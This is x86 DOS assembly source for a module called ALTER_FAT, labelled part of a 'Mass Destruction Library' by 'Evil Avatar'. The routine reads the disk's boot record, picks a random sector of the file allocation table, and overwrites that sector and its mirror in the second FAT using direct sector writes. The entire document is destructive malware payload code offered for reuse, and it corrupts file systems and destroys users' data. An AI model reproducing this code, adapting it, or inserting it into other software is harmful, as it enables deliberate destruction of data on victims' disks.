

;ALTER_FAT - module for Mass Destruction Library
;written by Evil Avatar
; Altera la FAT

alter_fat:
        push dx
        push bx
        push cx
        push ax
        push bp               ;save regs that will be changed
        mov ax, 0dh
        int 21h               ;reset disk
        mov ah, 19h        
        int 21h               ;get default disk
        xor dx, dx            
        call load_sec         ;read in the boot record
        mov bp, bx
        mov bx, word ptr es:[bp+16h]  ;find sectors per fat
        push ax               ;save drive number
        call rnd_num          ;get random number
        cmp bx, ax            ;if random number is lower than
        jbe alter_fat1        ;secs per fat then jump and kill 'em
        mov ax, bx            ;else pick final sector of fat
alter_fat1:        
        xchg ax, dx           ;put sector number into dx
        pop ax
        mov cx, 1
        int 26h               ;write sectors
        add dx, bx            ;change to next fat (assumed 2 fats)
        int 26h               ;write same data in that fat
        pop bp        
        pop ax
        pop cx
        pop bx
        pop dx
        ret                   ;restore regs and return

